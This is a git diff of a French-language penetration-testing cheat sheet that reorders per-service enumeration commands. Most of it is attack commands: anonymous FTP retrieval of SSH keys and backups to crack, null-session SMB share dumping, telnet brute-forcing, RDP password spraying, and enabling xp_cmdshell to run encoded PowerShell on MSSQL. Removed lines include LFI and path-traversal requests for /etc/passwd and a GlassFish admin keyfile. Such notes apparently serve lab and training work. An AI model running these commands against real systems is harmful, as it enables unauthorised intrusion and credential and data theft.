@@ -153,6 +153,13 @@ wget -m ftp://anonymous:anonymous@$target
 
 # Nmap scripts
 nmap -p 21 --script ftp-anon,ftp-syst,ftp-bounce $target
+
+
+ftp $target                    # anonymous:anonymous
+get id_rsa                     # Clé SSH
+get backup.zip                 # Cracker avec zip2john
+get .keychain                  # Cracker avec keychain2john
+wget -m ftp://anonymous:anonymous@$target  # Download tout le répertoire
 ```
 
 Chercher :
@@ -165,6 +172,13 @@ Chercher :
 nmap -p 22 -sV --script=ssh2-enum-algos,ssh-hostkey $target
 # Bannière, version OS, indices de réutilisation de clé faible
 # Ignorer jusqu'à avoir des credentials
+```
+
+### Telnet (23)
+
+```shell
+nmap -p 23 --script=telnet-brute,telnet-ntlm-info $target
+telnet $target 23
 ```
 
 ### SMTP (25)
@@ -206,6 +220,10 @@ rpcclient -U "" -N $target
 
 # Nmap null session
 nxc smb $target -u '' -p '' --shares
+
+smbclient -L //$target -N               # Lister les shares
+smbclient //$target/share -N -c 'mget *' # Download tout
+nxc smb $target -u '' -p '' --shares    # Null session
 ```
 
 ### SNMP (161)
@@ -222,13 +240,6 @@ snmpwalk -v2c -c public $target | grep <string>
 nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-processes $target
 ```
 
-### RDP (3389)
-
-```shell
-nmap -p 3389 --script=rdp-enum-encryption $target
-# Check encryption → indice sur la version Windows
-```
-
 ### MSSQL (1433)
 
 ```shell
@@ -237,52 +248,7 @@ impacket-mssqlclient user:pass@$target -windows-auth
 
 # Enum des bases de données
 SQL> SELECT name FROM sys.databases;
-```
 
-### Telnet (23)
-
-```shell
-nmap -p 23 --script=telnet-brute,telnet-ntlm-info $target
-telnet $target 23
-```
-
-### FTP (21)
-
-```shell
-ftp $target                    # anonymous:anonymous
-get id_rsa                     # Clé SSH
-get backup.zip                 # Cracker avec zip2john
-get .keychain                  # Cracker avec keychain2john
-wget -m ftp://anonymous:anonymous@$target  # Download tout le répertoire
-```
-
-### HTTP (80/443/8080)
-
-```shell
-# Enumération
-gobuster dir -u http://$target -w wordlist.txt -x php,txt,html
-nikto -h http://$target
-wpscan --url http://$target -e ap,at,u
-
-# CVEs courants
-# Mail Masta LFI
-curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
-
-# GlassFish Path Traversal
-curl "http://$target:4848/theme/META-INF/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile"
-```
-
-### SMB (445)
-
-```shell
-smbclient -L //$target -N               # Lister les shares
-smbclient //$target/share -N -c 'mget *' # Download tout
-nxc smb $target -u '' -p '' --shares    # Null session
-```
-
-### MSSQL (1433)
-
-```shell
 impacket-mssqlclient user:pass@$target -windows-auth
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell "powershell -e <BASE64>"
@@ -291,6 +257,9 @@ SQL> xp_cmdshell "powershell -e <BASE64>"
 ### RDP (3389)
 
 ```shell
+nmap -p 3389 --script=rdp-enum-encryption $target
+# Check encryption → indice sur la version Windows
+
 xfreerdp3 /u:user /p:password /v:$target /cert-ignore
 xfreerdp3 /cert-ignore /u:user /p:password /v:$target /drive:/var/www/html
 nxc rdp $target -u users.txt -p 'Password123'  # Spray
